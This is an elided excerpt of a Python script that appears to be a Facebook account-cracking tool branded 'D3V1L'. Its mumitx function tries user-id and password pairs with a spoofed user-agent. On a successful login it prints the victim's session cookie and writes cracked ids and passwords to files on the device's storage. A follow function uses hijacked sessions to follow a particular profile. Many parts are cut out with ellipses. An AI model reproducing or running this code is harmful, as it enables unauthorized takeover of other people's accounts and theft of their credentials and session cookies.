...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://www.facebook.com/tera.real.papa.dngerous.kiladi', {
...
def D3V1L():
    ...
    print('Ok Ids Saved in /D3V1L-OK.txt')
    print('Cp Ids Saved in /D3V1L-CP.txt')
    linex()
...
def mumitx(uid,pwx,tl):
    ...
    'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[D3V1L-OK] ' +uid+ ' | ' +ps+ ' \033[0;97m')
                print('\033[1;32m[COOKIE] = \033[1;37m'+coki+ '')
                cek_apk(session,coki)
                open('/sdcard/D3V1L-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in cp_cpx: 
                 print('\r\r\033[1;30m[D3V1L-CP]  ' +uid+ ' | ' +ps+ ' \033[0;97m')
                open('/sdcard/D3V1L-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s\033[0;97m[\033[0;96mD3V1L\033[0;97m]..[\033[0;94m%s/%s\033[0;97m]..[\033[0;92mOK\033[0;97m/\033[0;91mCP\033[0;97m]..[\033[0;92m%s\033[0;97m/\033[0;91m%s\033[0;97m] '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
